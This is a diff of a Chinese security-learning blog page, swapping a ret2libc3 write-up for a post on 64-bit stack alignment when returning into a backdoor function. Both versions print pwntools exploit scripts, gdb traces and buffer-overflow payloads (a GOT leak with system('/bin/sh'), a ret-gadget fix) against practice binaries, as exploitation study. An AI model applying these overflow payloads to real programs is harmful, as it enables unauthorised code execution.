@@ -4,10 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="wiki--ret2libc3, Matrix">
-    <meta name="description" content="1：checksechunter@hunter:~/PWN/level3$ checksec ret2libc3
-[*] &amp;#39;/home/hunter/PWN/level3/ret2libc3&amp;#39;
-    Arch:     i">
+    <meta name="keywords" content="偶遇栈平衡, Matrix">
+    <meta name="description" content="1：我自己写的一个简单程序#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;unistd.h&amp;gt;
+#include&amp;lt;stdlib.h&amp;gt;
+int main()
+{
+
+    char s[50];
+   ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +20,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>wiki--ret2libc3 | Matrix</title>
+    <title>偶遇栈平衡 | Matrix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -280,13 +285,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        wiki--ret2libc3
+                        偶遇栈平衡
                     </div>
                 </div>
             </div>
@@ -378,8 +383,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/wiki-pwn/" target="_blank">
-                                <span class="chip bg-color">wiki--pwn</span>
+                            <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
+                                <span class="chip bg-color">原理学习</span>
                             </a>
                         
                     </div>
@@ -393,21 +398,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-04
+                    2020-07-08
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.1k
+                        833
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        9 分
+                        4 分
                     </div>
                     
                 
@@ -423,181 +428,146 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre><code>hunter@hunter:~/PWN/level3$ checksec ret2libc3
-[*] &#39;/home/hunter/PWN/level3/ret2libc3&#39;
-    Arch:     i386-32-little
+                <h2 id="1：我自己写的一个简单程序"><a href="#1：我自己写的一个简单程序" class="headerlink" title="1：我自己写的一个简单程序"></a>1：我自己写的一个简单程序</h2><pre><code>#include&lt;stdio.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;stdlib.h&gt;
+int main()
+{
+
+    char s[50];
+    puts(&quot;what&quot;);
+    gets(s);
+ puts(s);
+
+
+    return 0;
+}
+
+void backdoor()
+{
+    system(&quot;cat test.py&quot;);
+
+}</code></pre><p>溢出漏洞显而易见</p>
+<h2 id="2：checksec"><a href="#2：checksec" class="headerlink" title="2：checksec"></a>2：checksec</h2><pre><code>hunter@hunter:~/buu-pwn$ checksec test
+[*] &#39;/home/hunter/buu-pwn/test&#39;
+    Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x8048000)</code></pre><p>只有NX开启</p>
-<h2 id="2：IDA-检查发现没有system和binsh字符串"><a href="#2：IDA-检查发现没有system和binsh字符串" class="headerlink" title="2：IDA 检查发现没有system和binsh字符串"></a>2：IDA 检查发现没有system和binsh字符串</h2><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+    PIE:      No PIE (0x400000)</code></pre><p>64位常规操作</p>
+<h2 id="3：IDA"><a href="#3：IDA" class="headerlink" title="3：IDA"></a>3：IDA</h2><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  char s; // [esp+1Ch] [ebp-64h]
+  char s; // [rsp+0h] [rbp-40h]
 
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(stdin, 0, 1, 0);
-  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);
-  printf(&quot;Can you find it !?&quot;);
-  gets(&amp;s);
+  puts(&quot;what&quot;);
+  gets(&amp;s, argv);
+  puts(&amp;s);
   return 0;
-}</code></pre><p>显然此处gets存在溢出</p>
-<h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre><code>[----------------------------------registers-----------------------------------]
-EAX: 0x0 
-EBX: 0x0 
-ECX: 0xf7fb25c0 --&gt; 0xfbad2288 
-EDX: 0xf7fb389c --&gt; 0x0 
-ESI: 0xf7fb2000 --&gt; 0x1d4d6c 
-EDI: 0x0 
-EBP: 0x6941414d (&#39;MAAi&#39;)
-ESP: 0xffffd04c (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
-EIP: 0x8048695 (&lt;main+125&gt;:    ret)
-EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-   0x804868a &lt;main+114&gt;:    call   0x8048440 &lt;gets@plt&gt;
-   0x804868f &lt;main+119&gt;:    mov    eax,0x0
-   0x8048694 &lt;main+124&gt;:    leave  
-=&gt; 0x8048695 &lt;main+125&gt;:    ret    
-   0x8048696:    xchg   ax,ax
-   0x8048698:    xchg   ax,ax
-   0x804869a:    xchg   ax,ax
-   0x804869c:    xchg   ax,ax
+}
+
+有个backdoor函数
+int backdoor()
+{
+  return system(&quot;cat test.py&quot;);
+}</code></pre><h2 id="4：gdb溢出点72"><a href="#4：gdb溢出点72" class="headerlink" title="4：gdb溢出点72"></a>4：gdb溢出点72</h2><pre><code>[-------------------------------------code-------------------------------------]
+   0x4005a3 &lt;main+44&gt;:    call   0x400460 &lt;puts@plt&gt;
+   0x4005a8 &lt;main+49&gt;:    mov    eax,0x0
+   0x4005ad &lt;main+54&gt;:    leave  
+=&gt; 0x4005ae &lt;main+55&gt;:    ret    
+   0x4005af &lt;backdoor&gt;:    push   rbp
+   0x4005b0 &lt;backdoor+1&gt;:    mov    rbp,rsp
+   0x4005b3 &lt;backdoor+4&gt;:    lea    rdi,[rip+0x9f]        # 0x400659
+   0x4005ba &lt;backdoor+11&gt;:    call   0x400470 &lt;system@plt&gt;
 [------------------------------------stack-------------------------------------]
-0000| 0xffffd04c (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
-0004| 0xffffd050 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
-0008| 0xffffd054 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
-0012| 0xffffd058 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
-0016| 0xffffd05c (&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
-0020| 0xffffd060 (&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
-0024| 0xffffd064 (&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
-0028| 0xffffd068 (&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+0000| 0x7fffffffde88 (&quot;IAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0008| 0x7fffffffde90 (&quot;AJAAfAA5AAKAAgAA6AAL&quot;)
+0016| 0x7fffffffde98 (&quot;AAKAAgAA6AAL&quot;)
+0024| 0x7fffffffdea0 --&gt; 0x4c414136 (&#39;6AAL&#39;)
+0032| 0x7fffffffdea8 --&gt; 0x400577 (&lt;main&gt;:    push   rbp)
+0040| 0x7fffffffdeb0 --&gt; 0x0 
+0048| 0x7fffffffdeb8 --&gt; 0xb7de885b3d5ed61a 
+0056| 0x7fffffffdec0 --&gt; 0x400490 (&lt;_start&gt;:    xor    ebp,ebp)
 [------------------------------------------------------------------------------]
 Legend: code, data, rodata, value
-0x08048695    30    in ret2libcGOT.c
-gdb-peda$ pattern offset AA8AANA
-AA8AANA found at offset: 112
-gdb-peda$ </code></pre><p>溢出点为112</p>
-<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>存在栈溢出，可利用函数为puts  gets。我们构造一个puts函数让其输出puts函数的got表地址上的内容–即真正的地址，利用栈溢出控制程序转跳来实现。得到puts函数的确切地址后找到该函数在libc文件中的offset即求出libc地址，有了libc地址啥都好说。将上面构造的puts函数返回地址设置为main函数就可再次进行程序控制，不过这次控制它打开shell。</strong></p>
-<p>exp：libc的地址也可以用__libc_start_main_got来获得</p>
-<pre><code>from pwn import*
-from LibcSearcher import*
-
+0x00000000004005ae in main ()
+gdb-peda$ pattern offset AAdAA3
+AAdAA3 found at offset: 64
+gdb-peda$ pattern offset IAAeA
+IAAeA found at offset: 72
+gdb-peda$ </code></pre><p>感觉没啥问题</p>
+<h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre><code>from pwn import*
 context.log_level = &#39;debug&#39;
 
-elf = ELF(&quot;ret2libc3&quot;)
-puts_plt = elf.plt[&#39;puts&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-#__libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]
-main_addr = elf.symbols[&#39;main&#39;]
-
-sh = process(&quot;./ret2libc3&quot;)
-
-#payload1 = &quot;A&quot;*112 + p32(puts_plt) + p32(main_addr) + p32(__libc_start_main_got)
-
-payload1 = &quot;A&quot;*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
-
+sh = process(&#39;./test&#39;)
 sh.recv()
-
+#使程序跳转到backdoor函数即可
+payload = &#39;A&#39;*72 +   p64(0x04005af)
 gdb.attach(sh)
+sh.sendline(payload)
 
-sh.sendline(payload1)
-
-puts_addr = u32(sh.recv(4))
-
-libc = LibcSearcher(&quot;puts&quot;,puts_addr)
-
-libc_addr = puts_addr - libc.dump(&quot;puts&quot;)
-system_addr = libc_addr + libc.dump(&quot;system&quot;)
-binsh_addr = libc_addr + libc.dump(&quot;str_bin_sh&quot;)
-
-payload2 = &quot;A&quot;*112 + p32(system_addr) + p32(0) + p32(binsh_addr)
-
-sh.sendline(payload2)
-
-sh.interactive()</code></pre><h3 id="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"><a href="#在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化" class="headerlink" title="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"></a>在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化</h3><h2 id="4-探究"><a href="#4-探究" class="headerlink" title="4:探究"></a>4:探究</h2><p>我们来看看main函数的反汇编：</p>
-<pre><code> 08048618 &lt;main&gt;:
- 8048618:    55                       push   ebp    
- 8048619:    89 e5                    mov    ebp,esp
- 804861b:    83 e4 f0                 and    esp,0xfffffff0
- 804861e:    83 c4 80                 add    esp,0xffffff80
- 8048621:    a1 60 a0 04 08           mov    eax,ds:0x804a060
- 8048626:    c7 44 24 0c 00 00 00     mov    DWORD PTR [esp+0xc],0x0
- 804862d:    00 
- 804862e:    c7 44 24 08 02 00 00     mov    DWORD PTR [esp+0x8],0x2
- 8048635:    00 
- 8048636:    c7 44 24 04 00 00 00     mov    DWORD PTR [esp+0x4],0x0
- 804863d:    00 
- 804863e:    89 04 24                 mov    DWORD PTR [esp],eax
- 8048641:    e8 5a fe ff ff           call   80484a0 &lt;setvbuf@plt&gt;
- 8048646:    a1 40 a0 04 08           mov    eax,ds:0x804a040
- 804864b:    c7 44 24 0c 00 00 00     mov    DWORD PTR [esp+0xc],0x0
- 8048652:    00 
- 8048653:    c7 44 24 08 01 00 00     mov    DWORD PTR [esp+0x8],0x1
- 804865a:    00 
- 804865b:    c7 44 24 04 00 00 00     mov    DWORD PTR [esp+0x4],0x0
- 8048662:    00 
- 8048663:    89 04 24                 mov    DWORD PTR [esp],eax
- 8048666:    e8 35 fe ff ff           call   80484a0 &lt;setvbuf@plt&gt;
- 804866b:    c7 04 24 40 87 04 08     mov    DWORD PTR [esp],0x8048740
- 8048672:    e8 e9 fd ff ff           call   8048460 &lt;puts@plt&gt;
- 8048677:    c7 04 24 6b 87 04 08     mov    DWORD PTR [esp],0x804876b
- 804867e:    e8 ad fd ff ff           call   8048430 &lt;printf@plt&gt;
- 8048683:    8d 44 24 1c              lea    eax,[esp+0x1c]
- 8048687:    89 04 24                 mov    DWORD PTR [esp],eax
- 804868a:    e8 b1 fd ff ff           call   8048440 &lt;gets@plt&gt;
- 804868f:    b8 00 00 00 00           mov    eax,0x0
- 8048694:    c9                       leave  
- 8048695:    c3                       ret   </code></pre><p>第一第二行是常规操作。</p>
-<h4 id="第四第五行：被称为栈对齐"><a href="#第四第五行：被称为栈对齐" class="headerlink" title="第四第五行：被称为栈对齐"></a>第四第五行：被称为栈对齐</h4><pre><code>804861b:    83 e4 f0                 and    esp,0xfffffff0  //esp最后一个字节清零
-804861e:    83 c4 80                 add    esp,0xffffff80  //esp倒数第二个字节如果大于等于8则变为8，小于则清零，倒数第一个字节也清零</code></pre><h3 id="栈对齐有关资料：64位"><a href="#栈对齐有关资料：64位" class="headerlink" title="栈对齐有关资料：64位"></a>栈对齐有关资料：64位</h3><blockquote>
-<p>许多计算机系统对基本数据类型的合法地址做了一些限制，要求某种类型对象的地址必须是某个值K的倍数，其中K具体如下图。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计。举个实际的例子：比如我们在内存中读取一个8字节长度的变量，那么这个变量所在的地址必须是8的倍数。如果这个变量所在的地址是8的倍数，那么就可以通过一次内存操作完成该变量的读取。倘若这个变量所在的地址并不是8的倍数，那么可能就需要执行两次内存读取，因为该变量被放在两个8字节的内存块中了。</p>
-</blockquote>
-<blockquote>
-<p>无论数据是否对齐，x86_64硬件都能正常工作，但是却会降低系统的性能，所以我们的编译器在编译时一般会为我们实施数据对齐。</p>
-</blockquote>
-<blockquote>
-<p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。<br>上文我们说，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p>
-<blockquote>
-<blockquote>
-<p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：<br>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。<br>大多数函数的栈帧的边界都必须是16直接的倍数。<br>在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p>
-</blockquote>
-</blockquote>
-</blockquote>
-<p>详情见：<a href="https://www.cnblogs.com/tcctw/p/11333743.html" target="_blank" rel="noopener">https://www.cnblogs.com/tcctw/p/11333743.html</a></p>
-<p>总结：为了满足数据对齐和栈字节对齐的要求，或者说规范，编译器不惜牺牲了部分内存，这使得程序提高了兼容性，也提高了程序的性能</p>
-<p><strong>在常规操作push  ebp 和mov  ebp，esp后面免不了这种调整栈空间的指令 这样的指令对第一次求溢出是没有影响的，因为只要看最后的ret部分。但是如果进行第二次攻击再次从main函数进入将再次执行这样的影响 esp的指令 我们再次使用之前的溢出点就可能会出错。就像这里的栈对齐操作，显然这个操作与esp本身的大小有关。在程序最后直接ret到main函数会导致esp加4从而下次的栈对齐操作因为esp变化了所以栈空间也会发生变化。导致变化完了后esp到ebp的距离不再是114. 解决方法就是在脚本中用gdb.attach()进入调试在即将进行第二次之前在main函数下断点，从而观察，调整溢出点。</strong></p>
-<h3 id="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"><a href="#下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104" class="headerlink" title="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"></a>下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104</h3><pre><code>EBX: 0x0 
-ECX: 0xf7f9b5c0 --&gt; 0xfbad2288 
-EDX: 0xf7f9c89c --&gt; 0x0 
-ESI: 0xf7f9b000 --&gt; 0x1d4d6c 
-EDI: 0x0 
-EBP: 0x41414141 (&#39;AAAA&#39;)
-ESP: 0xffbedef4 (&quot;AAAAAAAA\020-\340&quot;, &lt;incomplete sequence \367&gt;)
-EIP: 0x8048695 (&lt;main+125&gt;:    ret)
-EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+sh.interactive()</code></pre><h2 id="6：执行情况（gdb调试）"><a href="#6：执行情况（gdb调试）" class="headerlink" title="6：执行情况（gdb调试）"></a>6：执行情况（gdb调试）</h2><pre><code>RDI: 0x2 
+RBP: 0x7fffffffdd88 --&gt; 0x0 
+RSP: 0x7fffffffdd28 --&gt; 0x0 
+RIP: 0x7ffff7a332f6 (&lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0)
+R8 : 0x7ffff7dd1600 --&gt; 0x0 
+R9 : 0x0 
+R10: 0x8 
+R11: 0x246 
+R12: 0x400659 (&quot;cat test.py&quot;)
+R13: 0x7fffffffdfa0 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
-   0x804868a &lt;main+114&gt;:    call   0x8048440 &lt;gets@plt&gt;
-   0x804868f &lt;main+119&gt;:    mov    eax,0x0
-   0x8048694 &lt;main+124&gt;:    leave  
-=&gt; 0x8048695 &lt;main+125&gt;:    ret    
-   0x8048696:    xchg   ax,ax
-   0x8048698:    xchg   ax,ax
-   0x804869a:    xchg   ax,ax
-   0x804869c:    xchg   ax,ax
+   0x7ffff7a332e6 &lt;do_system+1078&gt;:    movq   xmm0,QWORD PTR [rsp+0x8]
+   0x7ffff7a332ec &lt;do_system+1084&gt;:    mov    QWORD PTR [rsp+0x8],rax
+   0x7ffff7a332f1 &lt;do_system+1089&gt;:    movhps xmm0,QWORD PTR [rsp+0x8]
+=&gt; 0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0     #程序到这里死活不能动
+   0x7ffff7a332fb &lt;do_system+1099&gt;:    call   0x7ffff7a23110 &lt;__GI___sigaction&gt;
+   0x7ffff7a33300 &lt;do_system+1104&gt;:    lea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 &lt;quit&gt;
+   0x7ffff7a33307 &lt;do_system+1111&gt;:    xor    edx,edx
+   0x7ffff7a33309 &lt;do_system+1113&gt;:    mov    edi,0x3
 [------------------------------------stack-------------------------------------]
-0000| 0xffbedef4 (&quot;AAAAAAAA\020-\340&quot;, &lt;incomplete sequence \367&gt;)
-0004| 0xffbedef8 (&quot;AAAA\020-\340&quot;, &lt;incomplete sequence \367&gt;)
-0008| 0xffbedefc --&gt; 0xf7e02d10 (&lt;system&gt;:    sub    esp,0xc)
-0012| 0xffbedf00 --&gt; 0x0 
-0016| 0xffbedf04 --&gt; 0xf7f418cf (&quot;/bin/sh&quot;)
-0020| 0xffbedf08 --&gt; 0xf7f9b000 --&gt; 0x1d4d6c 
-0024| 0xffbedf0c --&gt; 0xf7fce75a (add    edi,0x178a6)
-0028| 0xffbedf10 --&gt; 0xf7fe6000 --&gt; 0x26f34 
+0000| 0x7fffffffdd28 --&gt; 0x0 
+0008| 0x7fffffffdd30 --&gt; 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&#39;-c&#39;)
+0016| 0x7fffffffdd38 --&gt; 0x0 
+0024| 0x7fffffffdd40 --&gt; 0x1 
+0032| 0x7fffffffdd48 --&gt; 0x7ffff7a33360 (&lt;cancel_handler&gt;:    push   rbx)
+0040| 0x7fffffffdd50 --&gt; 0x7fffffffdd44 --&gt; 0xf7a3336000000000 
+0048| 0x7fffffffdd58 --&gt; 0x0 
+0056| 0x7fffffffdd60 --&gt; 0x0 
 [------------------------------------------------------------------------------]
-Legend: code, data, rodata, value</code></pre><p>最终结果：</p>
-<pre><code>[*] Switching to interactive mode
-v\x84\x04\x86\x84\x04\x90m���Z��\xb6\x84\x04Ƅ\x04
-No surprise anymore, system disappeard QQ.
-Can you find it !?$ ls</code></pre>
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00007ffff7a332f6 in do_system (line=0x400659 &quot;cat test.py&quot;) at ../sysdeps/posix/system.c:125
+125    ../sysdeps/posix/system.c: 没有那个文件或目录.
+gdb-peda$ </code></pre><h2 id="7：原因"><a href="#7：原因" class="headerlink" title="7：原因"></a>7：原因</h2><p><strong>向大佬求助得知，奈何涉及堆栈平衡，适时吾甚愚昧不知所云，只可将0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0指令铭记于心，付以esp寄存器需需结尾为0</strong><br><strong>若想根治则反复使用pop  ， ret指令平衡参数或跳转。以及自制代码buf莫要随意限其大小，常见128，512甚好（8的整数倍）</strong></p>
+<h3 id="修改利用ret指令"><a href="#修改利用ret指令" class="headerlink" title="修改利用ret指令"></a>修改利用ret指令</h3><pre><code>[DEBUG] Received 0xd3 bytes:
+    &#39;from pwn import*\n&#39;
+    &quot;context.log_level = &#39;debug&#39;\n&quot;
+    &#39;\n&#39;
+    &quot;sh = process(&#39;./test&#39;)\n&quot;
+    &#39;sh.recv()\n&#39;
+    &#39;#0x000000000040044e : ret\n&#39;
+    &quot;payload = &#39;A&#39;*72 + p64(0x040044e) +  p64(0x04005af)\n&quot;
+    &#39;gdb.attach(sh)\n&#39;
+    &#39;sh.sendline(payload)\n&#39;
+    &#39;\n&#39;
+    &#39;sh.interactive()\n&#39;
+from pwn import*
+context.log_level = &#39;debug&#39;
+
+sh = process(&#39;./test&#39;)
+sh.recv()
+#0x000000000040044e : ret
+payload = &#39;A&#39;*72 + p64(0x040044e) +  p64(0x04005af)
+gdb.attach(sh)
+sh.sendline(payload)
+
+sh.interactive()
+[*] Got EOF while reading in interactive
+$  </code></pre><p><strong>所以以后能跳转到system函数时出错看看是不是这个原因</strong></p>
+
             </div>
             <hr/>
 
@@ -737,7 +707,7 @@ Can you find it !?$ ls</code></pre>
                     </span>
                     <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/07/04/wiki-ret2libc3/" class="b-link-green">wiki--ret2libc3</a>
+                    <a href="/2020/07/08/ou-yu-zhan-ping-heng/" class="b-link-green">偶遇栈平衡</a>
                 </p>
             </div>
         </div>
@@ -762,72 +732,23 @@ Can you find it !?$ ls</code></pre>
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/07/04/xctf-string/">
+                <a href="/2020/07/10/zheng-mi-x64/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="XCTF-string">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="蒸米X64">
                         
-                        <span class="card-title">XCTF-string</span>
+                        <span class="card-title">蒸米X64</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1：checksechunter@hunter:~/PWN/XCTF/xctf_easy$ checksec string
-[*] &#39;/home/hunter/PWN/XCTF/xctf_easy/string&#39;
-    A</div>
+                    <div class="summary">1：X86 X64主要区别
+首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常
+其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参</div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-04
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-10
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-user fa-fw"></i>
-                            IT YUAN
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/xctf-pwn-easy/" target="_blank">
-                        <span class="chip bg-color">xctf-pwn-easy</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="StackOverFlow之Ret2ShellCode详解">
-                        
-                        <span class="card-title">StackOverFlow之Ret2ShellCode详解</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary">函数调用时栈中的变化 test示例代码:test.c
-#include &lt;stdio.h&gt;
-
-int fun(int a,int b)
-{
-    return a + b;
-}
-
-int main(int argc, char</div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-02
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -841,6 +762,49 @@ int main(int argc, char</div>
                     
                     <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
                         <span class="chip bg-color">原理学习</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/07/06/wiki-ret2libc2/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="wiki-ret2libc2">
+                        
+                        <span class="card-title">wiki-ret2libc2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">1：checksechunter@hunter:~/PWN/wiki/overflow$ checksec ret2libc2
+[*] &#39;/home/hunter/PWN/wiki/overflow/ret2libc2&#39;
+ </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            IT YUAN
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/wiki-pwn/" target="_blank">
+                        <span class="chip bg-color">wiki--pwn</span>
                     </a>
                     
                 </div>
